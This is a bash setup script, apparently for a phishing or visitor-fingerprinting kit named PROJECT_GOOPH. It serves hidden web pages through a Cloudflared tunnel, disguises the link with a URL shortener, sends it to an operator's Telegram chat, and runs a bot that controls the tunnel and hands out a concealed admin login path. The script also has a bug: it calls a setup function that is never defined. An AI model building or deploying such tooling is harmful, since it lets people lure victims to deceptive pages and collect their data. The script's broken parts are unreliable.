#!/bin/bash

# Function to display a banner
display_banner() {
    clear
    echo -e "\e[32m"
    echo -e "========================"
    echo -e "  PROJECT_GOOPH"
    echo -e "========================"
    echo -e "\e[0m"
}

# Ensure necessary directories and files are created
initialize_environment() {
    mkdir -p .tunnels_log .www .host
    touch .tunnels_log/port.log .tunnels_log/.cloudfl.log
    touch data.txt fingerprints.txt
    chmod -R 777 .host .manual_attack .pages .tunnels_log .www data.txt fingerprints.txt
}

# Start necessary scripts
start_initial_scripts() {
    echo -e "\e[32m\n[+] Starting initial scripts..."
    bash packages.sh
    bash tunnels.sh
}

# Function to install necessary packages and libraries
install_packages_and_libraries() {
    echo -e "\e[32m\n[+] Installing required packages and libraries..."
    apt update -y
    apt install -y python3 python3-venv python3-pip php curl wget unzip
}

# Function to create a Python virtual environment and install Python libraries
setup_python_env() {
    echo -e "\n[+] Setting up Python virtual environment..."
    python3 -m venv venv
    source venv/bin/activate
    pip install --upgrade pip
    pip install telepot requests
}

# Function to create or update configuration file
create_or_update_config() {
    config_file=".www/config.ini"
    if [[ -f $config_file ]]; then
        read -p "config.ini already exists. Do you want to update it? (y/n): " choice
        if [[ $choice != "y" ]]; then
            echo "Config update skipped."
            return
        fi
    fi

    read -p "Enter your Telegram bot token: " token
    read -p "Enter your Telegram chat ID: " chat_id

    cat <<EOL >$config_file
[telegram]
token = $token
chat_id = $chat_id
EOL

    echo "Config file created/updated successfully."
}

# Function to start PHP server
start_php_server() {
    echo -e "\n[+] Starting PHP server..."
    RANDOM_PORT=$(( ( RANDOM % 1000 ) + 8000 ))
    cd .www && php -S 127.0.0.1:$RANDOM_PORT > /dev/null 2>&1 &
    echo $RANDOM_PORT > ../.tunnels_log/port.log
    cd ..
}

# Function to start Cloudflared tunnel and shorten URL
start_cloudflared() {
    echo -e "\n[+] Starting Cloudflared tunnel..."
    RANDOM_PORT=$(cat .tunnels_log/port.log)
    if [[ $(command -v termux-chroot) ]]; then
        termux-chroot ./.host/cloudflared tunnel -url http://127.0.0.1:$RANDOM_PORT > .tunnels_log/.cloudfl.log 2>&1 &
    else
        ./.host/cloudflared tunnel -url http://127.0.0.1:$RANDOM_PORT > .tunnels_log/.cloudfl.log 2>&1 &
    fi

    sleep 12
    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
    if [[ -z $cldflr_url ]]; then
        echo "Error: Cloudflared URL not found."
        exit 1
    fi
    shortened_url=$(curl -s http://clck.ru/--?url=${cldflr_url})

    echo -e "\nCloudflared URL: ${cldflr_url}"
    echo -e "\nShortened URL: ${shortened_url}"

    if [[ -f .www/config.ini ]]; then
        TELEGRAM_TOKEN=$(grep 'token' .www/config.ini | cut -d '=' -f 2)
        TELEGRAM_CHAT_ID=$(grep 'chat_id' .www/config.ini | cut -d '=' -f 2)
        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" -d "text=Cloudflared URL: ${cldflr_url}\nShortened URL: ${shortened_url}&chat_id=${TELEGRAM_CHAT_ID}" > /dev/null
    else
        echo "config.ini not found in .www folder. Cannot send URL to Telegram."
    fi
}

# Function to setup and run Telegram bot
setup_telegram_bot() {
    config_file=".www/config.ini"
    if [[ ! -f $config_file ]]; then
        echo "config.ini not found. Please run the setup again."
        exit 1
    fi

    TELEGRAM_TOKEN=$(grep 'token' $config_file | cut -d '=' -f 2 | xargs)
    TELEGRAM_CHAT_ID=$(grep 'chat_id' $config_file | cut -d '=' -f 2 | xargs)

    # Write Python script for Telegram bot
    cat > cloudflare_manager_bot.py <<EOF
import sys
import time
import telepot
import requests
import subprocess
import re
from telepot.loop import MessageLoop
from telepot.namedtuple import ReplyKeyboardMarkup, KeyboardButton

TELEGRAM_TOKEN = '${TELEGRAM_TOKEN}'
bot = telepot.Bot(TELEGRAM_TOKEN)
tunnel_process = None

def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    if content_type == 'text':
        command = msg['text']
        if command == '/start':
            bot.sendMessage(chat_id, 'Welcome to the Cloudflare Manager Bot! Press a button:', reply_markup=ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text='Start Tunnel'), KeyboardButton(text='Stop Tunnel')],
                    [KeyboardButton(text='Get Tunnel URL'), KeyboardButton(text='Admin Access')],
                    [KeyboardButton(text='Update Bot')]
                ]
            ))
        elif command == 'Start Tunnel':
            start_tunnel(chat_id)
        elif command == 'Stop Tunnel':
            stop_tunnel(chat_id)
        elif command == 'Get Tunnel URL':
            get_tunnel_url(chat_id)
        elif command == 'Admin Access':
            admin_access(chat_id)
        elif command == 'Update Bot':
            update_bot(chat_id)

def start_tunnel(chat_id):
    global tunnel_process
    bot.sendMessage(chat_id, "Starting Cloudflared tunnel...")
    tunnel_process = subprocess.Popen(['./start.sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(10)
    bot.sendMessage(chat_id, "Tunnel started.")

def stop_tunnel(chat_id):
    global tunnel_process
    if tunnel_process:
        subprocess.Popen(['./stop.sh'])
        tunnel_process.terminate()
        bot.sendMessage(chat_id, "Tunnel stopped.")
    else:
        bot.sendMessage(chat_id, "No tunnel running.")

def get_tunnel_url(chat_id):
    try:
        with open('.tunnels_log/.cloudfl.log', 'r') as log_file:
            log_contents = log_file.read()
        cldflr_url = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_contents).group(0)
        shortened_url = requests.get(f"http://clck.ru/--?url={cldflr_url}").text
        bot.sendMessage(chat_id, f"Cloudflared URL: {cldflr_url}\nShortened URL: {shortened_url}")
    except Exception as e:
        bot.sendMessage(chat_id, f"Error retrieving URL: {e}")

def admin_access(chat_id):
    try:
        with open('.tunnels_log/.cloudfl.log', 'r') as log_file:
            log_contents = log_file.read()
        cldflr_url = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_contents).group(0)
        admin_url = f"{cldflr_url}/q/w/e/r/t/y/u/i/o/p/login.php"
        shortened_admin_url = requests.get(f"http://clck.ru/--?url={admin_url}").text
        bot.sendMessage(chat_id, f"Admin Panel URL: {shortened_admin_url}")
    except Exception as e:
        bot.sendMessage(chat_id, f"Error generating admin URL: {e}")

def update_bot(chat_id):
    bot.sendMessage(chat_id, "Updating bot... (Functionality under construction)")

def send_greeting_and_menu():
    bot.sendMessage(${TELEGRAM_CHAT_ID}, 'Welcome to the Cloudflare Manager Bot! Press a button:', reply_markup=ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text='Start Tunnel'), KeyboardButton(text='Stop Tunnel')],
            [KeyboardButton(text='Get Tunnel URL'), KeyboardButton(text='Admin Access')],
            [KeyboardButton(text='Update Bot')]
        ]
    ))

bot = telepot.Bot(TELEGRAM_TOKEN)
send_greeting_and_menu()
MessageLoop(bot, handle).run_as_thread()
print('Bot is listening...')

while True:
    time.sleep(10)
EOF

    # Run the Python script for the bot
    echo -e "\n[+] Running the Telegram bot..."
    source venv/bin/activate
    python3 cloudflare_manager_bot.py &
}


# Main script execution
display_banner
start_initial_scripts
install_packages_and_libraries
setup_python_env
setup_directories
create_or_update_config
start_php_server
start_cloudflared
setup_telegram_bot

echo -e "\n[+] Setup complete. The Cloudflare Manager Bot is now running."
